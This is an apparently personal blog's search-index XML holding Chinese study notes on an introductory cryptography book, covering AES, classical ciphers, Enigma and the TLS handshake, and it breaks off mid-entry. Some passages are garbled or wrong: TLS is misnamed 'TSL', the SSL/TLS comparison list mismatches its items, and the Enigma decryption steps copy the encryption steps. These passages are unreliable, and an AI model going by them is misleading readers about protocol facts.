结构；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② Rijndael 的输入分组为 128 比特，也就是 16 字节；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ Rijndael 加密的过程：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ 从上面的结构可以发现，输入的所有比特在一轮中都会被加密；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚀ SubBytes、ShiftRows 和 MixColumns 可以分别以字节、行和列为单位进行并行运算3.Rijndael 的解密 六、Rijndael 的破译 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实际上到现在为止还没有出现针对Rijndael 的有效攻击 七、应该使用哪种对称密码？ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① DES 已经不再于任何新的用途；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 三重 DES 也没有理由再于任何新的用途；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 大家应该使用的算法是 AES；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 我们不能使用任何自制的密码算法；]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第二章（历史上的密码）学习笔记]]></title>
    <url>%2F2019%2F06%2F15%2F2019.06.15%EF%BC%8868%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天主要回顾的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 凯撒密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 简单替换密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ Enigma&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 暴力破解&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 频率分析 一、恺撒密码 1.什么是恺撒密码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;凯撒密码是通过将明文中所使用的字母表按照一定的字数“平移”来进行加密。2.凯撒密码的加密：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;凯撒密码的加密过程是通过对字母进行平移进行加密，而平移字母的数量相当于“密钥”。3.凯撒密码的解密：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对凯撒密码的解密重要的是知道字母所平移的数量，如果已知平移的数字，那么就很容易破解恺撒密码。如果不知道平移的数字，那么可以通过暴力破解的方式进行破解。 二、简单替换密码 1.什么是简单替换密码？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于简单替换密码技术我是这样理解的：凯撒密码是通过平移字母来进行加密的，而简单替换密码则是将这种平移变成了无序对应，则可以将凯撒密码看作简单替换密码的一种特殊情况。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单替换密码的加密和解密的原理与凯撒密码的大同小异，但是简单替换密码的破解与凯撒密码的破解有着不一样的地方：恺撒密码可以通过暴力破解进行破译，而简单替换密码则需要频率分析进行破译。2.什么是频率分析？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;频率分析是利用了明文中的字母出现的频率与密文中的字母出现的频率一致这一特性，对于频率分析可以这样总结： 除了高频字母以外，低频字母也能够成为线索； 搞清开头和结尾能够成为线索，搞清单词之间的分隔也能偶成为线索； 密文越长越容易破解； 同一个字母连续出现能够成为线索（这是因为在简单替换密码中，某个字母在替换表中所对应的另一个字母是固定的） 破译速度会越来越快 三、Enigma 1.什么是Enigma？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;它是一个能够进行加密和解密的机器，由德国人在20世纪初期发明。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enigma是由键盘、齿轮、电池和灯泡组成的机器。2.Enigma加密的原理 发送者和接收者必须使用相同的密码才能够完成加密通信 发送者和接收者会收到国防军密码本 国防军密码本记载了发送者和接收者所使用的每日密码 3.Enigma的构造&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 每当按下 Enigma 上的一个键，就会点亮一个灯泡；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 加密者会操作 Enigma 的人可以在按键的时候读出灯泡所对应的字母；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 解密者将键和灯泡的读法相互换一下，再读出灯泡对应的字母进行解密；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 需要注意的是接线板：接线板是一种通过改变接线方式来改变字母对应关系的部件 4.Enigma 的加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 设置 Enigma&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 加密通信密码：通信密码的加密也是由 Enigma 完成的，假设发送者发送 PSV，则发送者需要输入两次该通信密码，也就是输入 PSVPSV（ATCDVT）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 重新设置 Enigma&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 加密消息：将明文 nacht 5个字母输入，并记录下所对应的 5 个字母（KXNMP）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 拼接：将加密后的通信密码（ATCDVT） + 加密后的消息（KXNMP）进行拼接，将ATCDVTKXNMP 作为电文发送出去。5.每日密码和通信密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 每日密码不是用来加密消息的，而是用来加密通信密码的，一般称为密钥加密密钥；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 通信密码是用来加密消息，用每日密码加密通信密码；6.Enigma 的解密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 分解&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 设置 Enigma：接收者可以查阅国防军密码本中的每日密码，并按照该密码设置 Enigma；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 解密通信密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 重新设置 Enigma：将明文 nacht 5个字母输入，并记录下所对应的 5 个字母（KXNMP）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ 解密消息：将加密后的通信密码（ATCDVT） + 加密后的消息（KXNMP）进行拼接，将ATCDVTKXNMP 作为电文发送出去。7.Enigma 的弱点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 将通信密码连续输入两次并加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 通信密码是人为选定的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 必须派发国防军密码本]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第一章（环游密码世界）学习笔记]]></title>
    <url>%2F2019%2F06%2F14%2F2019.06.14%EF%BC%8867%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天终于把论文的终稿弄完了，也可以好好的静下来继续测试和学习知识了，以后要抓紧时间，把以前没有完成的内容赶紧补回来，赶上大家的进度，今天我先把《图解密码技术》第一章的基础知识总结一下。 一、密码 1.密码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;密码最重要的是确保机密性，在这里主要是了解一下几种角色：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 发送者&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 接收者&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 窃听者：这里的窃听者Eve不一定是人类，有可能是窃听器，也有可能是邮件、软件和某些程序。2.破译：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;密码可以保证数据的机密性，但是攻击者可以利用各种漏洞对密码进行攻击 ，这种工作被称为密码破译，简称为破译。 二、对称密码和公钥密码 1.加密和解密算法合在一起统称为密码算法；2.对称密码是指加密和解密时使用同一个密钥的方式；3.公钥密码是指在加密和解密时使用不同密钥的方式，又称为非对称密码；4.混合密码系统是指将对称密码和公钥密码结合起来的密码方式； 三、其他密码技术 1.单向散列函数：它是为了防止数据被篡改设计出来的，可以根据单向散列函数得出的散列值，对数据的完整性进行判断。2.消息认证码：它是为了确认消息是否来自所期待的通信对象。通过消息认证码不仅能够保证完整性，也可以提供认证机制，但是它并不能防止否认和不能够对第三方进行确认。3.数字签名：是一种将现实世界中的签名和盖章移植到数字世界中的技术。数字签名既可以检测出伪装和篡改，也可以防止事后否认。4.伪随机数生成器：是一种能够模拟产生随机数列的算法。只有产生具有不可重现性（不可重现性 &gt; 不可预测性 &gt; 随机性）数值的伪随机数生成器才能够用于密码技术种。对密码体制中的工具来说，可以从下面的图中看出： 四、隐写术和数字水印 **密码隐藏的是内容，隐写术隐藏的是消息本身**&lt;/font&gt;。 五、密码与信息安全常识 **1.不要使用保密的密码算法** **2.使用低强度的密码比不进行任何加密更危险** **3.任何密码总有一天都会被破解**：严格的来说，绝对不会被破解的密码算法实际是存在的，这种算法被称为**一次性密码本**。 **4.密码只是信息安全的一部分**]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十五章（密码技术和现实生活）学习笔记]]></title>
    <url>%2F2019%2F06%2F03%2F2019.06.03%EF%BC%8866%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 学习的内容：本章学习的内容主要是对前14章所学的总结，今天就好好的总结一下吧。 1.密码学家的工具箱 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 对称密码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 主要是为了确保消息的机密性。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 目前主要使用的是 AES ，它的算法为Rrijndael算法；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 除了 AES 还有DES、三重 DES，它们是差分分析和线性分析。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 公钥密码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 是一种不同的密钥进行加密和解密的技术，也是用于确保消息的机密性（主要是密钥分配问题）。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 使用最为广泛的一种公钥密码算法是 RSA，除此之外还有 ELGamal 和 Rabin 等算法，以及与其相关 Diffie-Hellman 密钥交换（DH）和椭圆曲线 Diffie-Hellman 密钥交换（ECDH）等技术。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 公钥密码和对称密码一般都组成混合密码系统来使用的。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 单向散列函数：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 是一种将长消息转换为短散列值的技术，用于确保消息的完整性。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 包括的算法有SHA-1、SHA-2（SHA-256、SHA-384和SHA-512）和 SHA-3，除了SHA系列算法，还有MD4、MD5和 ROIPED-160 算法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 单向散列函数可以单独使用，也可以作为消息认证码、数字签名以及伪随机数生成器等技术的组成元素来使用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 消息认证码：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 是一种能识别通信对象发送的消息是否被篡改的认证技术，用于验证消息的完整性，以及对消息进行认证。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 该技术是利用了单向散列函数的HMAC，但是无法对第三方进行认证，也无法防止否认。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 数字签名：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 是一种能够对第三方进行消息认证，并能够防止通信对象做出否认的技术。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 数字签名的算法有RSA、ElGamal、DSA、椭圆曲线 DSA（ECDSA）、爱德华兹曲线DSA（EDDSA）等。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 伪随机数生成器：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 是一种能够生成具备不可预测性的比特序列的技术；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 由密码和单向散列函数构成的；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 伪随机数生成器用于生成密钥、初始化向量和 nonce 等 2.密码与认证 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于认证最关键的就是确保公钥的真实性和合法性 3.密码技术的框架 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正如上面所涉及到技术问题，SSL/TSL 提供了一种密码通信的框架，这就意味着SSL/TSL 中使用的对称密码、公钥密码、数字签名、单向散列函数等技术，都会像零件一样进行替换&lt;/font&gt;。但也必须要确保整体的兼容性，所以有推荐的套餐，而这种套餐也被称为”密码套件“。 4.密码技术和压缩技术 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 对称密码和公钥密码：机密性的压缩&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 单向散列函数：完整性的压缩&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 消息认证码和数字签名：认证的压缩&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 伪随机数生成器：不可预测性的压缩我们从另外一个角度来总结一下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 密钥是机密性的精华&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 散列值是完整性的精华&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 认证符号（MAC 值和签名）是认证的精华&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 种子是不可预测性的精华]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十四章（SSL/TSL）学习笔记]]></title>
    <url>%2F2019%2F06%2F01%2F2019.06.01%EF%BC%8865%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 学习的内容： SSL/TSL简介 使用SSL/TSL进行通信 对SSL/TSL的攻击 SSL/TSL用户注意的事项 一、SSL/TSL 简介 1.什么是SSL/TSL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL/TSL 是世界上应用最广泛的密码通信方法。SSL/TSL 综合运用了对称密码、公钥密码、消息认证码、数字签名、伪随机数生成器等密码技术，SSL/TSL 是一种在 web 服务器中广泛使用的协议。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL(Security Socket Layer) 与 TSL(Transport Layer Security) 是不同的，TSL 相当于 SSL 的后续版本2.SSL/TSL 承载 HTTP 协议&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL 或者 TSL 作为对通信加密的协议，可以在此之上承载 HTTP 协议。除了 HTTP 协议外，SSL 或 TSL 也可以保护其他协议，如：SMTP、POP3，如下图所示：3.SSL/TSL 的密码套件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SSL/TSL 需要解决的问题有机密性（对称密码）、密钥的不可预测性（伪随机数生成器）、对称密钥的安全（公钥密码/Diffie-Hellman秒交换）和通信对象的真实性（数字签名和证书）。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;正如上面所涉及到技术问题，SSL/TSL 提供了一种密码通信的框架，这就意味着SSL/TSL 中使用的对称密码、公钥密码、数字签名、单向散列函数等技术，都会像零件一样进行替换&lt;/font&gt;。但也必须要确保整体的兼容性，所以有推荐的套餐，而这种套餐也被称为”密码套件“。4.SSL/TSL 的区别&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ SSL：Security Socket Layer，安全套阶层，SSL3.0 协议存在可能导致POODLE攻击，因此SSL3.0 已经不安全了。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ TSL：RSA 和 ElGamal等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ 数字签名：Transport Layer Security ，传输层安全，实际相当于SSL3.1 二、使用 SSL/TSL 进行通信 1.层次化的协议&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;TLS 协议由以下两个协议组成：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ TLS 记录协议：位于底层，负责使用对称密码对消息进行加密通信的部分，该协议中使用了对称密码和消息认证码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;▣ TLS 握手协议：位于上层，负责除加密以外的其他操作，又分为 4 个子协议：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 握手协议：负责在客户端和服务器之间协商决定密码算法和共享密钥，它是 4 个子协议中最为复杂的一个&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 密码规格变更协议：负责向通信对象传达变更密码方式的信号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 警告协议：负责发生错误时，将错误信息传达给对方&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 应用数据协议：将 TSL 上面承载的应用数据传达给对象的协议2.TLS 记录协议&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该协议负责消息的压缩、加密以及数据的认证，其处理过程如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 消息被分割成多个较短的片段，对每个片段进行压缩&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 经过被压缩的片段加上消息认证码（完整性），并且为了防止重放攻击，还加上了片段的编号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 被压缩的片段 + 消息认证码通过对称密码进行加密（CBC模式，CBC模式初始化的向量通过主密码生成）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 将经过加密后的数据 + 数据类型、版本号、压缩后的长度组成的报头 = 最终的报文数据3.握手协议&nbsp;&nbsp;&nbsp;&nbsp;3-1.TLS 握手协议 - 握手协议&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有关握手协议的过程如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① ClientHello（客户端→服务器）：发送的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 可用的版本号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 当前时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 客户端随机数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 会话 ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 可用的密码套件清单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 可用的压缩方式清单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;②ServerHello（客户端←服务器）：发送的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 使用的版本号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 当前时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 服务器随机数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 会话 ID&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 使用的密码套件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 使用的压缩方式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ Certificate（客户端←服务器）：发送的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 证书清单：是一组X.509v3 证书序列。先发送的是服务器的证书，然后发送的是对服务器证书签名的认证机构的证书。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ ServerKey Exchange（客户端←服务器）：当Certificate消息不足时，服务器会通过ServerKeyExchange消息向客户端发送一些必要的信息。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑤ CertificateRequest（客户端←服务器）：发送的内容有：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 服务器能够理解的证书类型清单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;◈ 服务器能够理解的认证机构名称清单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当不使用客户端认证时，不会发送CertificateRequest消息&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑥ ServerHelloDone（客户端←服务器）：服务器的“问候”到此结束&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑦ Certificate（客户端→服务器）：如果 ⑤ 中服务器发送了 CertificateRequest 消息时，客户端会将自己的证书同 Certificate 消息一起发送给服务器。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果 ⑤ 中服务器没有发送 CertificateRequest 消息，客户端就不会发送 Certificate 消息给服务器。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑧ ClientKeyExchange（客户端→服务器）：客户端：这是经过加密的预备主密码（它是客户端生成的随机数，之后会被用作主密码的种子）。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑨ CertificateVerify（客户端→服务器）：客户端：我确实客户端证书持有的所有者。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只有在服务器发送Certificate 消息时才会发送 CertificateVerify 消息。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⑩ ChangeCipherSpec（客户端→服务器）：客户端：“好，我现在要切换密码了。”该协议实际上不是握手协议，而是密码规格变更协议。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**⑪ 